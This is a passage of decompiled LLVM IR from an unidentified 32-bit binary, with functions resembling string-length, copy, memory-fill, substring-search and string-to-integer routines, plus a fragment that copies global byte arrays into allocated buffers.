  %v0_116fc = load i32, i32* %sb.global-to-local, align 4
  store i32 %v3_116f4, i32* %r5.global-to-local, align 4
  %v4_11704 = call i32 @function_11814(i32 %v3_116f4, i32 ptrtoint ([7 x i8]* @global_var_121a8.365 to i32), i32 %v0_116fc)
  %v0_1170c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1170c, i32* @global_var_1a524.366, align 4
  %v1_11710 = trunc i32 %v0_116fc to i8
  store i8 %v1_11710, i8* bitcast (i32* @global_var_1a528.367 to i8*), align 4
  %v0_11714 = load i32, i32* %r6.global-to-local, align 4
  %v1_11714 = trunc i32 %v0_11714 to i8
  store i8 %v1_11714, i8* bitcast (i32* @global_var_1a529.368 to i8*), align 4
  %v1_11718 = call i32* @malloc(i32 23)
  %v3_11718 = ptrtoint i32* %v1_11718 to i32
  store i32 %v3_11718, i32* %r5.global-to-local, align 4
  %v4_11728 = call i32 @function_11814(i32 %v3_11718, i32 ptrtoint ([24 x i8]* @global_var_121b0.370 to i32), i32 23)
  %v0_11730 = load i32, i32* %r6.global-to-local, align 4
  %v1_11730 = trunc i32 %v0_11730 to i8
  store i8 %v1_11730, i8* bitcast (i32* @global_var_1a531.371 to i8*), align 4
  %v0_11734 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11734, i32* @global_var_1a52c.372, align 4
  store i8 23, i8* bitcast (i32* @global_var_1a530.373 to i8*), align 4
  %v2_1173c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1173c, i32* @r4, align 4
  ret i32 %v4_11728

; uselistorder directives
  uselistorder i32 %v3_116f4, { 1, 0 }
  uselistorder i32 %v3_116d0, { 1, 0 }
  uselistorder i32 %v3_116ac, { 1, 0 }
  uselistorder i32 %v3_11660, { 1, 0 }
  uselistorder i32 %v3_115c4, { 1, 0 }
  uselistorder i32 %v3_11578, { 1, 0 }
  uselistorder i32 %v2_11550, { 1, 0 }
  uselistorder i32 %v3_1143c, { 0, 2, 1 }
  uselistorder i32 %v2_1140c, { 0, 2, 1 }
  uselistorder i32 23, { 1, 0, 6, 2, 3, 4, 5 }
  uselistorder i32 19, { 4, 1, 0, 9, 5, 6, 7, 8, 10, 2, 11, 3, 12 }
  uselistorder i32 12, { 9, 5, 26, 31, 23, 32, 19, 16, 17, 18, 20, 21, 22, 24, 27, 28, 25, 33, 34, 35, 4, 36, 37, 38, 29, 30, 40, 41, 15, 42, 10, 43, 11, 44, 12, 45, 3, 46, 39, 81, 47, 48, 49, 50, 13, 51, 52, 53, 54, 55, 14, 56, 57, 58, 59, 60, 61, 6, 62, 63, 64, 65, 66, 67, 7, 68, 69, 8, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 82, 83, 84, 0, 1, 2 }
  uselistorder i32 17, { 3, 0, 14, 4, 15, 5, 6, 7, 8, 16, 17, 1, 18, 19, 20, 2, 21, 22, 23, 24, 25, 26, 9, 27, 10, 28, 29, 30, 11, 31, 12, 13 }
  uselistorder i32 21, { 3, 2, 8, 9, 10, 7, 0, 1, 4, 11, 5, 12, 6, 13 }
  uselistorder i8 16, { 17, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15 }
  uselistorder i32 14, { 0, 18, 1, 17, 4, 19, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 20, 21, 16, 22, 23, 24, 25, 2, 26, 27, 28, 29, 3, 30 }
  uselistorder i32 6, { 2, 29, 3, 15, 25, 16, 26, 17, 27, 14, 28, 0, 18, 30, 1, 4, 31, 32, 33, 19, 34, 5, 35, 36, 37, 20, 38, 6, 39, 40, 41, 21, 42, 43, 44, 22, 45, 49, 50, 51, 7, 52, 53, 54, 55, 8, 56, 57, 58, 59, 60, 23, 61, 9, 62, 63, 64, 65, 66, 67, 24, 68, 10, 69, 70, 71, 72, 11, 73, 12, 13, 74, 46, 47, 48 }
  uselistorder i8 5, { 0, 12, 11, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 5, { 4, 26, 5, 2, 16, 22, 17, 23, 18, 24, 15, 25, 3, 0, 19, 20, 21, 27, 28, 6, 29, 30, 31, 7, 32, 33, 34, 35, 8, 36, 37, 38, 39, 9, 40, 44, 45, 46, 47, 10, 48, 49, 50, 51, 11, 52, 53, 54, 55, 56, 57, 58, 12, 59, 60, 61, 62, 63, 64, 65, 13, 66, 67, 68, 69, 70, 71, 72, 73, 14, 74, 75, 41, 1, 42, 43 }
  uselistorder i32 7, { 1, 23, 2, 15, 19, 16, 20, 17, 21, 14, 22, 0, 18, 24, 25, 3, 26, 27, 4, 28, 29, 5, 30, 31, 6, 32, 33, 34, 35, 7, 36, 37, 38, 39, 8, 40, 41, 42, 43, 44, 9, 45, 46, 47, 48, 49, 10, 50, 51, 52, 53, 11, 54, 12, 13, 55 }
  uselistorder i32 29, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @function_11814, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 0, 5, 4, 3, 2, 1, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1a44c.264 to i32), { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* (i32)* @malloc, { 13, 0, 1, 2, 3, 14, 19, 7, 5, 6, 15, 17, 16, 9, 8, 22, 4, 12, 24, 21, 20, 18, 11, 25, 10, 23, 26 }
}

define i32 @function_11798(i8* %arg1) local_unnamed_addr {
dec_label_pc_11798:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1179c = load i8, i8* %arg1, align 1
  %v4_1179c = zext i8 %v3_1179c to i32
  %v2_117a0 = icmp eq i8 %v3_1179c, 0
  br i1 %v2_117a0, label %dec_label_pc_117bc, label %bb

dec_label_pc_117bc:                               ; preds = %dec_label_pc_117ac, %dec_label_pc_11798
  %merge = phi i32 [ %v4_1179c, %dec_label_pc_11798 ], [ %v1_117ac, %dec_label_pc_117ac ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_11798
  br label %dec_label_pc_117ac

dec_label_pc_117ac:                               ; preds = %dec_label_pc_117ac, %bb
  %v0_117ac = phi i32 [ %v1_117ac, %dec_label_pc_117ac ], [ 0, %bb ]
  %v1_117ac = add i32 %v0_117ac, 1
  %v2_117b0 = add i32 %v1_117ac, %tmp
  %v3_117b0 = inttoptr i32 %v2_117b0 to i8*
  %v4_117b0 = load i8, i8* %v3_117b0, align 1
  %v2_117b4 = icmp eq i8 %v4_117b0, 0
  br i1 %v2_117b4, label %dec_label_pc_117bc, label %dec_label_pc_117ac

; uselistorder directives
  uselistorder i32 %v1_117ac, { 1, 0, 2 }
}

define i32 @function_117c0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_117c0:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_117c0 = load i8, i8* %arg1, align 1
  %v3_117c0 = zext i8 %v2_117c0 to i32
  %v2_117c4 = icmp eq i8 %v2_117c0, 0
  br i1 %v2_117c4, label %dec_label_pc_11808, label %dec_label_pc_117cc

dec_label_pc_117cc:                               ; preds = %dec_label_pc_117c0
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_117d0

dec_label_pc_117d0:                               ; preds = %dec_label_pc_117d0, %dec_label_pc_117cc
  %v0_117d0 = phi i32 [ %v1_117d0, %dec_label_pc_117d0 ], [ 0, %dec_label_pc_117cc ]
  %v1_117d0 = add i32 %v0_117d0, 1
  store i32 %v1_117d0, i32* %ip.global-to-local, align 4
  %v2_117d4 = add i32 %v1_117d0, %tmp
  %v3_117d4 = inttoptr i32 %v2_117d4 to i8*
  %v4_117d4 = load i8, i8* %v3_117d4, align 1
  %v2_117d8 = icmp eq i8 %v4_117d4, 0
  br i1 %v2_117d8, label %dec_label_pc_117e0, label %dec_label_pc_117d0

dec_label_pc_117e0:                               ; preds = %dec_label_pc_117d0
  %v7_117e0 = icmp eq i32 %v0_117d0, -2
  br i1 %v7_117e0, label %dec_label_pc_11800, label %dec_label_pc_117ec.preheader

dec_label_pc_117ec.preheader:                     ; preds = %dec_label_pc_117e0, %dec_label_pc_11808
  %storemerge = phi i32 [ %v3_117c0, %dec_label_pc_11808 ], [ %v1_117d0, %dec_label_pc_117e0 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_117f8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_117ec

dec_label_pc_117ec:                               ; preds = %dec_label_pc_117ec.dec_label_pc_117ec_crit_edge, %dec_label_pc_117ec.preheader
  %v2_117f8 = phi i32 [ %v5_117f8, %dec_label_pc_117ec.dec_label_pc_117ec_crit_edge ], [ %v2_117f8.pre, %dec_label_pc_117ec.preheader ]
  %v0_117f0 = phi i32 [ %v0_117f0.pre, %dec_label_pc_117ec.dec_label_pc_117ec_crit_edge ], [ %tmp, %dec_label_pc_117ec.preheader ]
  %v0_117ec = phi i32 [ %v0_117ec.pre, %dec_label_pc_117ec.dec_label_pc_117ec_crit_edge ], [ %storemerge, %dec_label_pc_117ec.preheader ]
  %v1_117ec = add i32 %v0_117ec, -1
  store i32 %v1_117ec, i32* %r2.global-to-local, align 4
  %v1_117f0 = inttoptr i32 %v0_117f0 to i8*
  %v2_117f0 = load i8, i8* %v1_117f0, align 1
  %v5_117f0 = add i32 %v0_117f0, 1
  store i32 %v5_117f0, i32* %r1.global-to-local, align 4
  %v3_117f4 = icmp eq i32 %v0_117ec, 0
  %v3_117f8 = inttoptr i32 %v2_117f8 to i8*
  store i8 %v2_117f0, i8* %v3_117f8, align 1
  %v4_117f8 = load i32, i32* @r0, align 4
  %v5_117f8 = add i32 %v4_117f8, 1
  store i32 %v5_117f8, i32* @r0, align 4
  br i1 %v3_117f4, label %dec_label_pc_11800.loopexit, label %dec_label_pc_117ec.dec_label_pc_117ec_crit_edge

dec_label_pc_117ec.dec_label_pc_117ec_crit_edge:  ; preds = %dec_label_pc_117ec
  %v0_117ec.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_117f0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_117ec

dec_label_pc_11800.loopexit:                      ; preds = %dec_label_pc_117ec
  %v0_11800.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11800

dec_label_pc_11800:                               ; preds = %dec_label_pc_11800.loopexit, %dec_label_pc_117e0
  %v0_11800 = phi i32 [ %v0_11800.pre, %dec_label_pc_11800.loopexit ], [ %v1_117d0, %dec_label_pc_117e0 ]
  ret i32 %v0_11800

dec_label_pc_11808:                               ; preds = %dec_label_pc_117c0
  store i32 %v3_117c0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_117ec.preheader

; uselistorder directives
  uselistorder i32 %v5_117f8, { 1, 0 }
  uselistorder i32 %v0_117f0, { 1, 0 }
  uselistorder i32 %v1_117d0, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v3_117c0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_117ec.preheader, { 1, 0 }
}

define i32 @function_11814(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11814:
  %ip.global-to-local = alloca i32, align 4
  %v2_11814 = icmp eq i32 %arg3, 0
  br i1 %v2_11814, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_11820, %dec_label_pc_11814
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_11814
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11820

dec_label_pc_11820:                               ; preds = %dec_label_pc_11820, %bb
  %v0_11820 = phi i32 [ %v1_11828, %dec_label_pc_11820 ], [ 0, %bb ]
  %v2_11820 = add i32 %v0_11820, %arg2
  %v3_11820 = inttoptr i32 %v2_11820 to i8*
  %v4_11820 = load i8, i8* %v3_11820, align 1
  %v4_11824 = add i32 %v0_11820, %arg1
  %v5_11824 = inttoptr i32 %v4_11824 to i8*
  store i8 %v4_11820, i8* %v5_11824, align 1
  %v0_11828 = load i32, i32* %ip.global-to-local, align 4
  %v1_11828 = add i32 %v0_11828, 1
  store i32 %v1_11828, i32* %ip.global-to-local, align 4
  %v9_1182c = icmp eq i32 %v1_11828, %arg3
  br i1 %v9_1182c, label %.loopexit, label %dec_label_pc_11820

; uselistorder directives
  uselistorder i32 %v1_11828, { 1, 2, 0 }
}

define i32 @function_11838() local_unnamed_addr {
dec_label_pc_11838:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v0_11838 = load i32, i32* @r1, align 4
  %v2_11838 = icmp eq i32 %v0_11838, 0
  br i1 %v2_11838, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_11838
  %v2_1183c = load i32, i32* @r0, align 4
  ret i32 %v2_1183c

bb3:                                              ; preds = %dec_label_pc_11838
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_118484 = load i32, i32* @r0, align 4
  %v5_118485 = inttoptr i32 %v3_118484 to i8*
  store i8 0, i8* %v5_118485, align 1
  %v0_1184c6 = load i32, i32* %r3.global-to-local, align 4
  %v1_1184c7 = add i32 %v0_1184c6, 1
  store i32 %v1_1184c7, i32* %r3.global-to-local, align 4
  %v1_118508 = load i32, i32* @r1, align 4
  %v9_1185010 = icmp eq i32 %v1_1184c7, %v1_118508
  br i1 %v9_1185010, label %dec_label_pc_11858, label %dec_label_pc_11848.dec_label_pc_11848_crit_edge

dec_label_pc_11848.dec_label_pc_11848_crit_edge:  ; preds = %bb3, %dec_label_pc_11848.dec_label_pc_11848_crit_edge
  %v1_1184c11 = phi i32 [ %v1_1184c, %dec_label_pc_11848.dec_label_pc_11848_crit_edge ], [ %v1_1184c7, %bb3 ]
  %v0_11848.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_11848.pre to i8
  %v3_11848 = load i32, i32* @r0, align 4
  %v4_11848 = add i32 %v3_11848, %v1_1184c11
  %v5_11848 = inttoptr i32 %v4_11848 to i8*
  store i8 %extract.t, i8* %v5_11848, align 1
  %v0_1184c = load i32, i32* %r3.global-to-local, align 4
  %v1_1184c = add i32 %v0_1184c, 1
  store i32 %v1_1184c, i32* %r3.global-to-local, align 4
  %v1_11850 = load i32, i32* @r1, align 4
  %v9_11850 = icmp eq i32 %v1_1184c, %v1_11850
  br i1 %v9_11850, label %dec_label_pc_11858, label %dec_label_pc_11848.dec_label_pc_11848_crit_edge

dec_label_pc_11858:                               ; preds = %dec_label_pc_11848.dec_label_pc_11848_crit_edge, %bb3
  %v1_11858 = load i32, i32* @r0, align 4
  ret i32 %v1_11858

; uselistorder directives
  uselistorder i32 %v1_1184c, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_11848.dec_label_pc_11848_crit_edge, { 1, 0 }
}

define i32 @function_1185c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1185c:
  %v7_11870 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_11870, label %dec_label_pc_11874, label %dec_label_pc_1187c

dec_label_pc_11874:                               ; preds = %dec_label_pc_11890, %dec_label_pc_1185c, %dec_label_pc_1187c
  ret i32 -1

dec_label_pc_1187c:                               ; preds = %dec_label_pc_1185c
  %tmp10 = icmp slt i32 %arg2, 1
  br i1 %tmp10, label %dec_label_pc_11874, label %dec_label_pc_11884

dec_label_pc_11884:                               ; preds = %dec_label_pc_1187c
  br label %dec_label_pc_1189c

dec_label_pc_11890:                               ; preds = %dec_label_pc_118b4, %dec_label_pc_1189c
  %v1_11890 = add i32 %v0_118bc, 1
  %v9_11894 = icmp eq i32 %v1_11890, %arg2
  br i1 %v9_11894, label %dec_label_pc_11874, label %dec_label_pc_1189c

dec_label_pc_1189c:                               ; preds = %dec_label_pc_11890, %dec_label_pc_11884
  %v0_118bc = phi i32 [ %v1_11890, %dec_label_pc_11890 ], [ 0, %dec_label_pc_11884 ]
  %v0_118a8 = phi i32 [ %v1_118a8., %dec_label_pc_11890 ], [ 0, %dec_label_pc_11884 ]
  %v2_1189c = add i32 %v0_118a8, %arg3
  %v3_1189c = inttoptr i32 %v2_1189c to i8*
  %v4_1189c = load i8, i8* %v3_1189c, align 1
  %v2_118a0 = add i32 %v0_118bc, %arg1
  %v3_118a0 = inttoptr i32 %v2_118a0 to i8*
  %v4_118a0 = load i8, i8* %v3_118a0, align 1
  %v9_118a4 = icmp eq i8 %v4_118a0, %v4_1189c
  %v1_118a8 = add i32 %v0_118a8, 1
  %v1_118a8. = select i1 %v9_118a4, i32 %v1_118a8, i32 0
  br i1 %v9_118a4, label %dec_label_pc_118b4, label %dec_label_pc_11890

dec_label_pc_118b4:                               ; preds = %dec_label_pc_1189c
  %v9_118b4 = icmp eq i32 %v1_118a8., %arg4
  br i1 %v9_118b4, label %dec_label_pc_118bc, label %dec_label_pc_11890

dec_label_pc_118bc:                               ; preds = %dec_label_pc_118b4
  %v1_118bc = add i32 %v0_118bc, 1
  ret i32 %v1_118bc

; uselistorder directives
  uselistorder i1 %v9_118a4, { 1, 0 }
  uselistorder i32 %v0_118a8, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11874, { 0, 2, 1 }
}

define i32 @function_118c4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_118c4:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_118d0

dec_label_pc_118d0:                               ; preds = %.thread, %dec_label_pc_118e8, %bb, %dec_label_pc_118c4
  %v0_118d0 = phi i32 [ %tmp, %dec_label_pc_118c4 ], [ %v5_118d0, %bb ], [ %v5_118d0, %dec_label_pc_118e8 ], [ %v5_118d0, %.thread ]
  %v1_118d0 = inttoptr i32 %v0_118d0 to i8*
  %v2_118d0 = load i8, i8* %v1_118d0, align 1
  %v5_118d0 = add i32 %v0_118d0, 1
  %v7_118d8 = icmp eq i8 %v2_118d0, 9
  br i1 %v7_118d8, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_118d0
  br label %dec_label_pc_118d0

bb:                                               ; preds = %dec_label_pc_118d0
  %v8_118dc = icmp eq i8 %v2_118d0, 32
  br i1 %v8_118dc, label %dec_label_pc_118d0, label %dec_label_pc_118e8

dec_label_pc_118e8:                               ; preds = %bb
  %v7_118e8 = icmp eq i8 %v2_118d0, 10
  br i1 %v7_118e8, label %dec_label_pc_118d0, label %dec_label_pc_118f0

dec_label_pc_118f0:                               ; preds = %dec_label_pc_118e8
  %v7_118f0 = icmp eq i8 %v2_118d0, 45
  br i1 %v7_118f0, label %dec_label_pc_119d0, label %dec_label_pc_118f8

dec_label_pc_118f8:                               ; preds = %dec_label_pc_118f0
  %v7_118f8 = icmp eq i8 %v2_118d0, 43
  br i1 %v7_118f8, label %bb54, label %dec_label_pc_11908

bb54:                                             ; preds = %dec_label_pc_118f8
  %v2_118fc = inttoptr i32 %v5_118d0 to i8*
  %v3_118fc = load i8, i8* %v2_118fc, align 1
  %v6_118fc = add i32 %v0_118d0, 2
  br label %dec_label_pc_11908

dec_label_pc_11908:                               ; preds = %bb54, %dec_label_pc_118f8, %dec_label_pc_119d0
  %v0_119b442 = phi i32 [ %v5_119d0, %dec_label_pc_119d0 ], [ %v5_118d0, %dec_label_pc_118f8 ], [ %v6_118fc, %bb54 ]
  %v0_1193017.in = phi i8 [ %v2_119d0, %dec_label_pc_119d0 ], [ %v2_118d0, %dec_label_pc_118f8 ], [ %v3_118fc, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_119d0 ], [ 2147483647, %dec_label_pc_118f8 ], [ 2147483647, %bb54 ]
  %v0_119e0 = phi i32 [ 1, %dec_label_pc_119d0 ], [ 0, %dec_label_pc_118f8 ], [ 0, %bb54 ]
  %v2_11910 = urem i32 %storemerge1, %arg2
  %v2_11920 = udiv i32 %storemerge1, %arg2
  store i32 %v2_11920, i32* @lr, align 4
  br label %dec_label_pc_11930

dec_label_pc_11930:                               ; preds = %.thread8, %dec_label_pc_11908
  %v0_119b4 = phi i32 [ %v5_119b4, %.thread8 ], [ %v0_119b442, %dec_label_pc_11908 ]
  %v2_119ac11 = phi i32 [ %v1_119c829, %.thread8 ], [ 0, %dec_label_pc_11908 ]
  %v1_11988 = phi i32 [ %v0_119bc27, %.thread8 ], [ 0, %dec_label_pc_11908 ]
  %v1_11970.in = phi i8 [ %v2_119b4, %.thread8 ], [ %v0_1193017.in, %dec_label_pc_11908 ]
  %v1_11970 = zext i8 %v1_11970.in to i32
  %v1_11930 = urem i32 %v1_11970, 256
  %v1_11934 = add nsw i32 %v1_11930, -48
  %v1_1193c = add nsw i32 %v1_11930, -97
  %v1_11940 = add nsw i32 %v1_11970, -48
  %v1_11944 = add nsw i32 %v1_11930, -65
  %tmp77 = icmp ult i32 %v1_11934, 10
  br i1 %tmp77, label %dec_label_pc_11974, label %dec_label_pc_1194c

dec_label_pc_1194c:                               ; preds = %dec_label_pc_11930
  %v2_1194c = icmp ugt i32 %v1_11944, 24
  %v7_1194c = icmp eq i32 %v1_11944, 25
  %v2_11950 = xor i1 %v7_1194c, true
  %v3_11950 = and i1 %v2_1194c, %v2_11950
  br i1 %v3_11950, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_1194c
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_1194c, %bb55
  %v0_1196421 = phi i32 [ %v1_11940, %dec_label_pc_1194c ], [ 0, %bb55 ]
  %v2_11954 = xor i1 %v2_1194c, true
  %v3_11954 = or i1 %v7_1194c, %v2_11954
  br i1 %v3_11954, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_11964 = phi i32 [ %v0_1196421, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_11950, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_1195c = icmp ugt i32 %v1_1193c, 24
  %v11_1195c = icmp eq i32 %v1_1193c, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_11960 = phi i1 [ %v7_1194c, %bb58 ], [ %v11_1195c, %bb59 ]
  %v0_11960 = phi i1 [ %v2_1194c, %bb58 ], [ %v6_1195c, %bb59 ]
  %v2_11960 = xor i1 %v1_11960, true
  %v3_11960 = and i1 %v0_11960, %v2_11960
  br i1 %v3_11960, label %dec_label_pc_119bc, label %dec_label_pc_11964

dec_label_pc_11964:                               ; preds = %bb60
  %v2_11964 = icmp eq i32 %v0_11964, 0
  %. = select i1 %v2_11964, i32 87, i32 55
  %v2_11970 = sub nsw i32 %v1_11970, %.
  br label %dec_label_pc_11974

dec_label_pc_11974:                               ; preds = %dec_label_pc_11930, %dec_label_pc_11964
  %v0_1198837 = phi i32 [ %v1_11944, %dec_label_pc_11930 ], [ %., %dec_label_pc_11964 ]
  %v3_119ac12 = phi i32 [ %v1_11940, %dec_label_pc_11930 ], [ %v2_11970, %dec_label_pc_11964 ]
  %v6_11978 = icmp slt i32 %v3_119ac12, %arg2
  br i1 %v6_11978, label %dec_label_pc_1197c, label %dec_label_pc_119bc

dec_label_pc_1197c:                               ; preds = %dec_label_pc_11974
  %v3_1197c = icmp uge i32 %v2_119ac11, %v2_11920
  %v9_1197c = icmp eq i32 %v2_119ac11, %v2_11920
  %v2_11980 = xor i1 %v3_1197c, true
  %v3_11980 = or i1 %v9_1197c, %v2_11980
  br i1 %v3_11980, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_1197c
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_1197c, %bb63
  %v0_1198836 = phi i32 [ %v0_1198837, %dec_label_pc_1197c ], [ 0, %bb63 ]
  %v2_11984 = xor i1 %v9_1197c, true
  %v3_11984 = and i1 %v3_1197c, %v2_11984
  br i1 %v3_11984, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_11988 = phi i32 [ %v0_1198836, %bb64 ], [ 1, %bb65 ]
  %tmp78 = icmp slt i32 %v1_11988, 0
  %v4_11988 = zext i1 %tmp78 to i32
  %v5_11988 = or i32 %v0_11988, %v4_11988
  %v7_11988 = icmp eq i32 %v5_11988, 0
  br i1 %v7_11988, label %dec_label_pc_11994, label %.thread8

dec_label_pc_11994:                               ; preds = %bb66
  %v7_119a4 = icmp sgt i32 %v3_119ac12, %v2_11910
  br i1 %v7_119a4, label %bb69, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_11994
  br label %bb70

bb69:                                             ; preds = %dec_label_pc_11994
  %v2_119a8 = icmp eq i1 %v9_1197c, false
  br i1 %v2_119a8, label %bb70, label %.thread8

bb70:                                             ; preds = %bb69, %.thread5
  %v4_119ac13 = mul i32 %v2_119ac11, %arg2
  %v5_119ac14 = add i32 %v3_119ac12, %v4_119ac13
  br label %.thread8

.thread8:                                         ; preds = %bb69, %bb66, %bb70
  %v1_119c829 = phi i32 [ %v2_119ac11, %bb69 ], [ %v2_119ac11, %bb66 ], [ %v5_119ac14, %bb70 ]
  %v0_119bc27 = phi i32 [ -1, %bb69 ], [ -1, %bb66 ], [ 1, %bb70 ]
  %v1_119b4 = inttoptr i32 %v0_119b4 to i8*
  %v2_119b4 = load i8, i8* %v1_119b4, align 1
  %v5_119b4 = add i32 %v0_119b4, 1
  br label %dec_label_pc_11930

dec_label_pc_119bc:                               ; preds = %dec_label_pc_11974, %bb60
  %v1_119bc = icmp slt i32 %v1_11988, 0
  %v2_119e0 = icmp eq i32 %v0_119e0, 0
  br i1 %v1_119bc, label %dec_label_pc_119e0, label %dec_label_pc_119c4

dec_label_pc_119c4:                               ; preds = %dec_label_pc_119bc
  br i1 %v2_119e0, label %bb72, label %bb71

bb71:                                             ; preds = %dec_label_pc_119c4
  %v2_119c8 = sub i32 0, %v2_119ac11
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_119c4, %bb71
  %v23_119cc = phi i32 [ %v2_119ac11, %dec_label_pc_119c4 ], [ %v2_119c8, %bb71 ]
  ret i32 %v23_119cc

dec_label_pc_119d0:                               ; preds = %dec_label_pc_118f0
  %v1_119d0 = inttoptr i32 %v5_118d0 to i8*
  %v2_119d0 = load i8, i8* %v1_119d0, align 1
  %v5_119d0 = add i32 %v0_118d0, 2
  br label %dec_label_pc_11908

dec_label_pc_119e0:                               ; preds = %dec_label_pc_119bc
  %.76 = select i1 %v2_119e0, i32 2147483647, i32 -2147483648
  ret i32 %.76

; uselistorder directives
  uselistorder i1 %v9_1197c, { 1, 0, 2 }
  uselistorder i1 %v3_1197c, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_1194c, { 1, 2, 0 }
  uselistorder i1 %v2_1194c, { 1, 0, 2 }
  uselistorder i32 %v1_11930, { 1, 2, 0 }
  uselistorder i32 %v1_11970, { 1, 0, 2 }
  uselistorder i32 %v1_11988, { 1, 0 }
  uselistorder i32 %v2_119ac11, { 0, 1, 6, 3, 2, 4, 5 }
  uselistorder i32 %v0_119b4, { 1, 0 }
  uselistorder i32 %v2_11920, { 1, 0, 2 }
  uselistorder i32 %storemerge1, { 1, 0 }
  uselistorder i32 %v5_118d0, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_118d0, { 0, 1, 3, 2 }
  uselistorder i32 25, { 23, 24, 3, 11, 4, 12, 5, 13, 2, 14, 10, 6, 15, 0, 16, 17, 18, 7, 8, 19, 9, 20, 21, 1, 22 }
  uselistorder i32 24, { 31, 32, 60, 39, 61, 40, 41, 48, 52, 33, 34, 35, 36, 37, 38, 55, 42, 43, 44, 45, 46, 47, 49, 50, 56, 51, 57, 53, 54, 62, 63, 64, 58, 59, 65, 11, 12, 13, 14, 0, 15, 16, 1, 17, 2, 18, 3, 4, 19, 5, 6, 68, 20, 7, 69, 21, 22, 8, 70, 23, 71, 72, 73, 24, 25, 9, 74, 26, 75, 27, 28, 10, 76, 29, 77, 78, 66, 30, 67 }
  uselistorder i8 32, { 7, 8, 9, 0, 10, 11, 1, 2, 12, 3, 4, 5, 6 }
  uselistorder i8 9, { 3, 2, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_11974, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_11908, { 2, 0, 1 }
  uselistorder label %dec_label_pc_118d0, { 1, 2, 0, 3 }
}

define i32 @function_119f0(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_119f0:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_119f0 = load i32, i32* @r4, align 4
  store i32 %v3_119f0, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
